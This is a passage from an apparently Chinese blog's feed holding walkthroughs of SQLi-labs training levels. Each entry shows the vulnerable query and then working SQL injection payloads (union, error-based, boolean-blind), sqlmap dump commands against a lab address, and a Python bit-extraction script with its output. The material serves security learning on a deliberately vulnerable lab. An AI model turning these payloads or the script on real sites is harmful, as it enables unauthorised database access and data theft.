      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less57/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less57/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span>// Querry DB to get the correct output<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此关闭合方式为双引号**”**,在十四次之内找到通关密码即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表 ?id<span class="token operator">=</span>-1<span class="token string">" union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 数据表：4tx6x8i0r6爆破数据字段?id=-1"</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'4tx6x8i0r6'</span>--+ 字段：secret_5NSX获取密码?id<span class="token operator">=</span>-1"union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select secret_5NSX from 4tx6x8i0r6<span class="token punctuation">)</span>--+密码：UpYmUvGqIBq77VJwWtBdP1s7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less56</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less56/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less56/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此关闭合方式为’),在十四次之内找到通关密码即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表 ?id<span class="token operator">=</span>-1<span class="token string">') union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 数据表：2f9r4ilh2y爆破数据字段 ?id=-1'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'2f9r4ilh2y'</span>--+ 字段：secret_BL6H获取密码?id<span class="token operator">=</span>-1'<span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select secret_BL6H from 2f9r4ilh2y<span class="token punctuation">)</span>--+密码：eOSw9qFmolZQu7VpE0ipHRV4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less55</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less55/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/less55/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=(<span class="token variable">$id</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>闭合方式为小括号),一共十四次机会\ <a name="qqbdN"></a></p><h1 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h1><p><code>?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code>&amp;#x20;<br>数据表：3cr26yzl9f <a name="bNqYh"></a></p><h1 id="爆破数据字段"><a href="#爆破数据字段" class="headerlink" title="爆破数据字段"></a>爆破数据字段</h1><p><code>?id=-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name='3cr26yzl9f'--+</code>&amp;#x20;<br>字段：secret_TATB <a name="VdFKq"></a></p><h1 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h1><p><code>?id=-1) union select 1,2,(select secret_TATB from 3cr26yzl9f)--+</code><br>密码：zXYZR5qfxz3Q2LUi8v1ip6dx</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less65</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less65/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less65/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span>// Querry DB to get the correct output<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=(<span class="token variable">$id</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后的闭合方式为双引号加小括号**”) ** <a name="tTcqx"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><code>sqlmap -u http://192.168.31.193/Less-65/?id=1 --current-db </code></p><blockquote><p>challenges</p></blockquote><p><code>sqlmap -u http://192.168.31.193/Less-65/?id=1 -D challenges --tables</code></p><blockquote><p>ha0jys304v</p></blockquote><p><code>sqlmap -u http://192.168.31.193/Less-65/?id=1 -D challenges -T ha0jys304v --dump</code></p><blockquote><p>WNpZ8ZytUpExmC9fRdiAtLF2</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less64</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less64/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less64/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable"><span class="token punctuation">((</span>$id<span class="token punctuation">))</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此关的闭合方式为双括号))，还是盲注的问题</p><p><a name="tTcqx"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><code>sqlmap -u http://192.168.31.193/Less-64/?id=1 -D challenges --tables</code></p><blockquote><p>1wo4hyndr5</p></blockquote><p><code>sqlmap -u http://192.168.31.193/Less-64/?id=1 -D challenges -T 1wo4hyndr5 --dump</code></p><blockquote><p>k0Kx2B7urBqzcrJ5uwEoMcEI</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less62</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less62/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less62/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过简单的测试发现没有了回显，试一试布尔盲注，有130次机会</p><p><code>?id=1')--+</code><br>回显正确，说明要闭合’)</p><p><code>?id=1') order by 3--+</code><br>回显正常<br><code>?id=1') order by 4--+</code><br>非正常回显<br>说明有3个字段 <a name="bKHrc"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>二分法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">猜解数据库表名,?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">') and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;100--+回显正常，说明第一个字母ASCII小于100?id=1'</span><span class="token punctuation">)</span> and <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">50</span>--+回显正常，说明第一个字母ASCII大于50爆破字段名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">') and (ascii(substr((select column_name from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 1,1),1,1)))&gt;50--+回显正确，说明第一个字符的ASCII值大于50?id=1'</span><span class="token punctuation">)</span> and <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select column_name from information_schema.columns where table_name<span class="token operator">=</span>'users' limit <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">100</span>--+回显正确，说明第一个字符的ASCII值小于100字段名?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">') and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+回显正确，说明第一个字符的ASCII值小于80?id=1'</span><span class="token punctuation">)</span> and <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span> select  id users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">30</span>--+回显正确，说明第一个字符的ASCII值大于30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="Iv94S"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">注入点检查sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-62/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span>数据库名称sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-62/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> --current-db <span class="token parameter variable">--level</span> <span class="token number">3</span>数据库：challenges数据表名称sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-62/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> <span class="token string">"challenges"</span> <span class="token parameter variable">--tables</span>数据表：p108evlf4Cp108evlf4C密码sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-62/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> <span class="token string">"challenges"</span> <span class="token parameter variable">-T</span> <span class="token string">"p108evlf4C"</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="FmWXj"></a></p><h1 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/python3</span><span class="token comment"># -*-coding:utf-8-*-</span><span class="token function">import</span> re<span class="token function">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://192.168.31.193/Less-62/?id=1"</span>  <span class="token comment"># 改成你的地址</span>try_count <span class="token operator">=</span> <span class="token number">0</span>def extract_bits<span class="token punctuation">(</span>query, i, bit_values: list<span class="token punctuation">)</span>:    <span class="token string">""</span>"    获取query执行结果的第 i 个（从1开始算）字符的3个比特    哪3个比特由bit_values指定    <span class="token string">""</span>"    global try_count    assert len<span class="token punctuation">(</span>bit_values<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span>    bit_marks <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">v</span> <span class="token keyword">in</span> bit_values:        bit_marks <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">v</span>    payload <span class="token operator">=</span> <span class="token string">""</span>"    <span class="token string">'+(SELECT CASE ASCII(SUBSTRING(({query}), {i}, 1)) &amp; ({bit_mark})    WHEN {0} THEN 1    WHEN {1} THEN 2    WHEN {2} THEN 3    WHEN {3} THEN 4    WHEN {4} THEN 5    WHEN {5} THEN 6    WHEN {6} THEN 7    ELSE 8END)+'</span>    <span class="token string">""</span>".format<span class="token punctuation">(</span>*bit_values<span class="token punctuation">[</span>:7<span class="token punctuation">]</span>, <span class="token assign-left variable">query</span><span class="token operator">=</span>query, <span class="token assign-left variable">bit_mark</span><span class="token operator">=</span>bit_marks, <span class="token assign-left variable">i</span><span class="token operator">=</span>i<span class="token punctuation">)</span>    payload <span class="token operator">=</span> re.sub<span class="token punctuation">(</span>r<span class="token string">'\s+'</span>, <span class="token string">' '</span>, payload.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>.replace<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span>, <span class="token string">" "</span><span class="token punctuation">))</span>    <span class="token comment"># print(payload)</span>    resp <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url, <span class="token assign-left variable">params</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token builtin class-name">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>    try_count <span class="token operator">+=</span> <span class="token number">1</span>    infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Angelina"</span>, <span class="token string">"Dummy"</span>, <span class="token string">"secure"</span>, <span class="token string">"stupid"</span>, <span class="token string">"superman"</span>, <span class="token string">"batman"</span>, <span class="token string">"admin"</span>, <span class="token string">"admin1"</span><span class="token punctuation">]</span>    match <span class="token operator">=</span> re.search<span class="token punctuation">(</span>r<span class="token string">"Your Login name : (.*?)&lt;br&gt;"</span>, resp.text<span class="token punctuation">)</span>    assert match    assert match.group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">in</span> infos    bits <span class="token operator">=</span> bit_values<span class="token punctuation">[</span>infos.index<span class="token punctuation">(</span>match.group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span><span class="token punctuation">]</span>    <span class="token builtin class-name">return</span> bitsdef extract_data<span class="token punctuation">(</span>query, length<span class="token punctuation">)</span>:    <span class="token string">""</span>"    获取query查询结果的length个字符，每个字符只获取其第7位和前5位    <span class="token string">""</span>"    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span>, length+1<span class="token punctuation">)</span>:        b2 <span class="token operator">=</span> extract_bits<span class="token punctuation">(</span>query, i, <span class="token punctuation">[</span>0b00000000, 0b00000001, 0b00000010, 0b00000011, 0b00000100, 0b00000101, 0b00000110, 0b00000111<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 00000111</span>        b1 <span class="token operator">=</span> extract_bits<span class="token punctuation">(</span>query, i, <span class="token punctuation">[</span>0b00000000, 0b00001000, 0b00010000, 0b00011000, 0b01000000, 0b01001000, 0b01010000, 0b01011000<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 01011000</span>        <span class="token keyword">if</span> b1 <span class="token operator">&amp;</span> 0b01000000 <span class="token operator">==</span> <span class="token number">0</span>:            <span class="token comment"># 该字符为数字</span>            bit <span class="token operator">=</span> b1 <span class="token operator">|</span> b2 <span class="token operator">|</span> 0b00100000        else:            <span class="token comment"># 该字符为字母</span>            bit <span class="token operator">=</span> b1 <span class="token operator">|</span> b2        res <span class="token operator">+=</span> chr<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    <span class="token builtin class-name">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token builtin class-name">:</span>    table_name <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"select table_name from information_schema.TABLES where TABLE_SCHEMA='challenges' limit 1"</span>, <span class="token number">10</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"table_name:"</span>, table_name<span class="token punctuation">)</span>    secret_key <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x"</span> % table_name, <span class="token number">24</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"secret_key:"</span>, secret_key<span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"Done. try_count:"</span>, try_count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>└─<span class="token comment"># python3 1.py          </span>table_name: KGP53AD9TAsecret_key: VHWF7RD0GNPXMAUTDA2537WODone. try_count: <span class="token number">68</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less58</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过猜解发现闭合方式为单引号’<br>&amp;#x20;尝试后发现没有了回显，采用报错注入的方式进行爆破</p><p><code>?id=1' and 1=1--+</code><br><code>?id=1' and 1=2--+</code> <a name="xUWO0"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表?id<span class="token operator">=</span>-1<span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +数据表：ya8oopss6p爆破字段名?id=-1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'ya8oopss6p'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +字段：secret_VCIW获取密码?id<span class="token operator">=</span>-1' and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select secret_VCIW from ya8oopss6p<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +密码：hS3pemAQq50IlYe5RRctDcPH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less54</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less54/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Please input the ID as parameter with numeric value as done in Lab excercises<br>请输入ID作为参数，数值与实验室练习相同</p><p>The objective of this challenge is to dump the (secret key) from only random table from Database (‘CHALLENGES’) in Less than 10 attempts<br>这个挑战的目标是在不到10次的尝试中从数据库（“CHALLENGES”）中仅转储随机表中的（密钥）</p><p>For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.<br>有趣的是，每次重置时，挑战都会产生随机的表名、列名和表数据。随时保持新鲜。</p></blockquote><p><a name="naIEd"></a></p><h1 id="判断字段数，"><a href="#判断字段数，" class="headerlink" title="判断字段数，"></a>判断字段数，</h1><p>用去两次机会</p><p><code>?id=1' order by 4--+</code></p><blockquote><p>You have made : 1 of 10 attempts<br>您已进行了：10次尝试中的1次</p></blockquote><p><code>?id=1' order by 3--+</code></p><blockquote><p>You have made : 2 of 10 attempts<br>Your Login name:Dumb<br>Your Password:Dumb</p></blockquote><p>直接省略信息收集，数据库猜解阶段， <a name="DK0D3"></a></p><h2 id="直接开始爆破数据表名称"><a href="#直接开始爆破数据表名称" class="headerlink" title="直接开始爆破数据表名称"></a>直接开始爆破数据表名称</h2><p><code>?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code></p><blockquote><p>You have made : 3 of 10 attempts<br>Your Login name:2<br>Your Password:aqzhac4it5</p></blockquote><p>数据表名：aqzhac4it5 <a name="Jpz4K"></a></p><h1 id="破数据字段名称"><a href="#破数据字段名称" class="headerlink" title="破数据字段名称"></a>破数据字段名称</h1><p><code>?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='aqzhac4it5'--+</code></p><blockquote><p>You have made : 4 of 10 attempts<br>Your Login name:2<br>Your Password:id,sessid,secret_9EA8,tryy</p></blockquote><p>数据字段：secret_9EA8 <a name="psE1z"></a></p><h1 id="最后找通关密码"><a href="#最后找通关密码" class="headerlink" title="最后找通关密码"></a>最后找通关密码</h1><p><code>?id=-1' union select 1,2,(select secret_9EA8  from aqzhac4it5 )--+</code></p><blockquote><p>You have made : 5 of 10 attempts<br>Your Login name:2<br>Your Password:FEC1PsNRKY3v1kumLxMCgYNa</p></blockquote><p>通关密码：FEC1PsNRKY3v1kumLxMCgYNa</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less10</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less9/less10/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less9/less10/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>双引号闭合</p><p><code>?id=1"</code>显示You are in………..<br><code>?id=1"</code>也显示You are in………..</p><p>与Less9的区别在于闭合方式为 双引号，<br>同样是时间盲注</p><p><a name="WFWr1"></a></p><h1 id="使用python时间盲注脚本"><a href="#使用python时间盲注脚本" class="headerlink" title="使用python时间盲注脚本"></a>使用python时间盲注脚本</h1><p><a href="https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822269804-e683f9ad-2d5c-4eda-bfe6-cdc0578a20b1.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822269804-e683f9ad-2d5c-4eda-bfe6-cdc0578a20b1.py%22,%22name%22:%22time-blind.py%22,%22size%22:3709,%22type%22:%22text/x-python%22,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22mode%22:%22title%22,%22download%22:true,%22taskId%22:%22uccc0b203-7879-4264-955e-69651a58aa2%22,%22taskType%22:%22upload%22,%22__spacing%22:%22both%22,%22id%22:%22ua027682d%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">time-blind.py</a></p><blockquote><p>url = ‘<a href="http://192.168.31.193/Less-10/?id=1">http://192.168.31.193/Less-10/?id=1</a>“‘</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/sql-python<span class="token punctuation">]</span>└─<span class="token comment"># python3 time-blind.py </span>数据库名为-<span class="token operator">&gt;</span>s数据库名为-<span class="token operator">&gt;</span>se数据库名为-<span class="token operator">&gt;</span>sec数据库名为-<span class="token operator">&gt;</span>secu数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>securt数据库名为-<span class="token operator">&gt;</span>securty第一个表为-<span class="token operator">&gt;</span>e第一个表为-<span class="token operator">&gt;</span>em第一个表为-<span class="token operator">&gt;</span>ema第一个表为-<span class="token operator">&gt;</span>emai第二个表为-<span class="token operator">&gt;</span>f第二个表为-<span class="token operator">&gt;</span>fe第三个表为-<span class="token operator">&gt;</span>s字段二为-<span class="token operator">&gt;</span>H字段二为-<span class="token operator">&gt;</span>H*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据库名为securty</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less8</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less7/less8/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less7/less8/</url>
      
